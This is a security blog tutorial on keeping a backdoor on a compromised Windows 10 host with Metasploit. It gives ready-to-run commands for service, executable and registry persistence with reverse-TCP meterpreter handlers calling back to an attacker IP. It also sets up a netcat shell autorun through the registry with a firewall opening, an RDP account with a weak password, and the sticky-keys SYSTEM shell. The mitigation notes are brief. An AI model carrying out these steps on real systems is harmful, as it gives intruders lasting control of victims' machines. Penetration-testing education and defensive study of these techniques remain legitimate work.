---
title: 'Multiple Ways to Persistence on Windows 10 with Metasploit'
date: 2020-01-26T17:35:00+01:00
draft: false
---

In this article, you will learn the multiple ways to maintain access or create a persistent backdoor with the help of the Metasploit Framework on the host machine which you have compromised.

### **Table of Content**

Persistence Backdoor

Pre-requisites

Methods for Generating persistence using Metasploit

*   Persistence\_service
*   Mitigation method for persistence\_service exploit.
*   Persistence\_exe
*   Mitigation method for persistence\_exe exploit.
*   Registry\_persistence
*   Mitigation method for Registry\_persistence exploit.
*   Persistence through Netcat.
*   Persistence through Remote Desktop Protocol.

 Conclusion

### **Persistence Backdoor**

The word Persistence is simply known as permanent hence in this post, we are sharing the multiple methods to generate a permanent backdoor within the victim machine.

As there is a lot of hard work required to exploit any system and once the system is exploited successfully you need more time for further examine or penetrate the victim’s system but at that time if victim shut down his system or changed the credentials then all your hard work will be spoiled. That’s why maintaining access is an important phase of penetration testing. Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials and other interruptions that could cut off their access.

### **Pre-requisites**

**Window 10** -Victim System

**Kali Linux** – Attacker (Metasploit Framework)

**Note:** For creating a persistence backdoor, you should have a compromised machine of the victim with meterpreter session to continue all practices that are taught in this post.

### **Methods for Generating persistence using Metasploit**

Let’s start, we already have compromised the window 10 (victim’s PC) and have meterpreter session along with the admin rights. To know how to get admin access click here. Now, we want to leave a permanent backdoor in the victim system that will provide a reverse connection for the next time.

### **Service Persistence**

This Module will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.

Thus, we will run the following commands on Kali Linux to run the above-listed module:

```
use exploit/windows/local/persistence\_service  
set session 2  
set lport 5678  
exploit
```

Above said module which will generate and upload an executable on the victim’s system under the /temp directory as  “lVFC.exe” and will make it a persistence service.

![](https://i0.wp.com/1.bp.blogspot.com/-pZeUMPV-f40/Xi24L7q_M1I/AAAAAAAAifg/DNwWGyPyJzc-TMbTJm7P8Ryu6Sm0xP1sQCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

If the victim reboots the system, the previous meterpreter session will be closed. Only we need to set up the multi handler to run the payload by using the following commands:

```
use exploit/multi/handler  
set payload windows/meterpreter/reverse\_tcp  
set lhost 192.168.0.115  
set lport 5678  
exploit
```

Once the victim system starts, automatically we will gain the meterpreter session again.

![](https://i0.wp.com/1.bp.blogspot.com/-Z4C3DJsaVFs/Xi24ORf2g9I/AAAAAAAAigE/ujqFb8O7LJghCFEYaQKr1AbrSm8Pqy6zACLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

When the PC is started automatically some of its services starts by default so persistence\_service exploit creates a new service that will start the payload whenever the service is running. In the below image you can see the executable file IVFC.exe is running under username System and we can verify its path.

C:/Windows/Temp/IVFC.exe

![](https://i0.wp.com/1.bp.blogspot.com/-F3csNbwi2T4/Xi24Osm1WmI/AAAAAAAAigI/2M2jIa4SxOUWmlUY5qN_dnKckQyar_SDQCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

**Mitigation method for persistence\_service exploit**

First of all, identify the unfamiliar files which are running and then stop the running executable format file i.e. IVFC.exe and delete it from the temp directory.

### **Persistence\_exe**

This is the second method to maintain access to the victim’s PC. Under this scenario, we already have meterpreter session of the victim’s PC and it has user access.

This module will upload an executable to the victim’s system and make it persistent. It can be installed as a user, system or service. We will use this module by using the session 1(already compromised system’session) and set the rexpath (remote executable path), through this payload file will create on victim’s PC but due to persistence script, it will save under temp directory with default.exe name(change the name under rexname option ) and will set it to autorun under the registry path mentioned in below image.

 To run this module, type the following commands:

```
use post/windows/manage/persistence\_exe  
set session 1  
set rexepath /root/payload.exe  
exploit
```

![](https://i2.wp.com/1.bp.blogspot.com/-HyjeaMCc5LE/Xi24OjHwKCI/AAAAAAAAigM/-Y0JKQZ1rqUpdwSMMRgoRuqbvjMOXE8UwCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

After, successful execution of the above module, now we have to set up the multi handle by using the following command:

```
use exploit/multi/handler  
set payload windows/meterpreter/reverse\_tcp  
set lhost 192.168.0.115  
set lport 1234  
exploit
```

Once the victim reboots its PC and the login into it, automatically we will get the meterpreter session.

![](https://i2.wp.com/1.bp.blogspot.com/-6jQGxA3wYZU/Xi24OyUEZhI/AAAAAAAAigQ/VfpcxmUJGJschNcJrfcbmthsJgl1LIq_wCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

In the below image you can see the function of persistence\_exe, which will create the autorun service under the registry editor path:

```
HKCU/software/microsoft/windows/currentversion/run/FOCxoPAO
```

due to which service will start running as soon as the victim’s PC starts. Its default file creates under the temp directory.

**![](https://i0.wp.com/1.bp.blogspot.com/-wBuZgiLWtLQ/Xi24PDo_3BI/AAAAAAAAigU/GkASTknTLhoPb8wBb9ACwFEOi1MBG-POgCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)**

**Mitigation Method for Persistence\_exe**

First, remove the entry from the registry editor under the path:

```
HKCU/software/microsoft/windows/currentversion/run/FOCxoPAO
```

And then delete the executable payload file under the temp directory and reboot the system.

### **Registry Persistence**

A registry is the core part of the window and contains a surplus of raw data. Attackers love to choose windows registry locations to hook their codes so that files or codes cannot be detected by scans for suspicious activities.

This module will install a payload that is executed during boot. It will be executed either at user logon or system startup via the registry value in “CurrentVersion\\Run” (depending on privilege and selected method). The payload will be installed completely in the registry.

Since we already have compromised the victim’s Pc and have the meterpreter session along with the user privileges. Use the following command to execute the registry persistence.

```
use exploit/windows/local/registry\_persistence   
set session 1  
set lport 7654  
exploit
```

Once the exploit executed, it will create a registry key under HKCU\\software\\wl4cN9w and installed key as highlighted in the image.

![](https://i1.wp.com/1.bp.blogspot.com/-zySYcy1yWjo/Xi24Pb-p5VI/AAAAAAAAigY/x8DKOnRtTOEFJYk2JprjPUtg2SGTMjBOgCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

If the victim reboots the system, meterpreter session will dead get the session again just set up the multi handler payload and execute it.

```
use exploit/multi/handler  
set set payload windows/meterpreter/reverse\_tcp  
set lhost 192.168.0.115  
set lport 7654  
exploit
```

Once the victim’s machine will start and as the victim will log in into the system, automatically we will get the meterpreter session again due to the autorun script under the registry which is installed by the attacker. Successfully registry \_persistence is executed.

![](https://i1.wp.com/1.bp.blogspot.com/-0PGV-6Y1eII/Xi24P-x1L7I/AAAAAAAAigc/oE9DrUrZT6ExOJq8YWF_XDCcBJax8wvJQCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

Through the below image you can verify the path of registry key created by registry\_persistence exploit.

![](https://i2.wp.com/1.bp.blogspot.com/-3bYo7FbDNxM/Xi24L6ro3rI/AAAAAAAAifo/Ah212b1PrY05DDo91z81Rf_mT6Htao3RACLcBGAsYHQ/s1600/10.png?w=687&ssl=1)

### **Persistence through Netcat**

Netcat or nc is a utility tool that uses TCP and UDP connections to read and write in a network. It can be used for both attack and security. In the case of attack, it can be driven by scripts which makes it quite dependable back-end and if we talk about security, it helps us to debug the network along with investing it. To read more about netcat please refer [https://www.hackingarticles.in/comprehensive-guide-on-netcat/](https://www.hackingarticles.in/comprehensive-guide-on-netcat/).

Now we are going to make a persistence Netcat backdoor on the compromised system. As we already have meterpreter session, upload netcat.exe into system32 file of victim’s pc by using the following command:

```
upload /usr/share/windows-binaries/nc.exe C:\\\\windows\\\\system32
```

![](https://i2.wp.com/1.bp.blogspot.com/-WF40gKw5wbw/Xi24L4-8UYI/AAAAAAAAifk/lVs-u6FXavQhu-V4sT-XyLHcUib1Q1hhwCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)

The next step is to set the netcat to listen on the random port i.e.4445, open the port on startup and make the connection.

Use the following command:

```
reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v netcat -d 'C:\\windows\\system32\\nc.exe -Ldp 4445 -e cmd.exe'
```

On successful netcat connection, we get the shell of the victim’s PC.

We will add the new rule in the firewall named as ‘netcat’ in which inbound connection will allow for port 4445 by using the interactive cmd prompt running a command called netsh. Type the following command:

```
netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445
```

To check the operational mode and port status run the command:

```
netsh firewall show portopening
```

![](https://i0.wp.com/1.bp.blogspot.com/-VwMuccqb4Pk/Xi24M7DbwYI/AAAAAAAAifs/jJXUhNDQuyQnf_9vQxH5EkoM4K1CDcNFQCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

When the victim reboots the system again, we will get the netcat shell. On Kali Linux(attacker system) run the following command to connect our netcat backdoor via port 4445.

```
nc -nv 192.168.0.142 4445
```

![](https://i0.wp.com/1.bp.blogspot.com/-yrQ5COx2gI0/Xi24M7ZIRYI/AAAAAAAAifw/2JiBmoBncJgOVtFObMNj48RKH6vhtjDeQCLcBGAsYHQ/s1600/13.png?w=687&ssl=1)

### **Persistence through RDP**

After having the meterpreter session of the already compromised targeted system. We will utilize Carlos Perez’s **getgui** script which enables Remote Desktop and creates a user account to login to it.

**Username: Nisha**

**Password: 123**

Run the following command:

```
run getgui -e -u nisha -p 123
```

![](https://i1.wp.com/1.bp.blogspot.com/-hOfOQgNjiH0/Xi24NDf9cnI/AAAAAAAAif0/fkyO4xHFtdUerD3WN56uTiwYKE5lcka2gCLcBGAsYHQ/s1600/14.png?w=687&ssl=1)

With the help of the following module, it is possible to apply the ‘sticky keys’ hack to a session with appropriate rights. The hack provides a means to get a SYSTEM shell using UI-level interaction at an RDP login screen or via a UAC confirmation dialog.

```
use post/windows/manage/sticky\_keys  
set session 2  
exploit
```

As you can see here that we sticky is added successfully, now to launch the exploit at an RDP or UAC by press shift key 5 times.

![](https://i0.wp.com/1.bp.blogspot.com/-3mD7VhzW4y4/Xi24NWFirkI/AAAAAAAAif4/O0HAW9_jDRIM3MBjK89KjWZf0cc8McvxQCLcBGAsYHQ/s1600/15.png?w=687&ssl=1)

Now we will check the connection using rdesktop and review the certificate and type **Yes**. By using the following command

```
rdesktop 192.168.0.142
```

![](https://i0.wp.com/1.bp.blogspot.com/-K5HtdUcBvMw/Xi24Nh4QKHI/AAAAAAAAif8/gipr9vb8aaMP-h0InCKLKFo3juAS9Uw4gCLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

Congrats !!! finally we get the Gui mode of the victim’s system.

![](https://i2.wp.com/1.bp.blogspot.com/-3nP6CybmaQM/Xi24N3gLR-I/AAAAAAAAigA/8-nFUTKvgDsgZEGszWHu8peT8qxhPrTpwCLcBGAsYHQ/s1600/17.jpg?w=687&ssl=1)

 **Conclusion**

Persistence does not require any authentication to connect with the victim’s system. To complete the penetration testing, always remember to clean up the processes and the backdoor services on the victim’s host.

**Author**: Nisha Sharma is trained in Certified Ethical hacking and Bug Bounty Hunter. Connect with her [**here**](https://www.linkedin.com/in/nishasharmaa/?originalSubdomain=in)

The post [Multiple Ways to Persistence on Windows 10 with Metasploit](https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/38KxrhX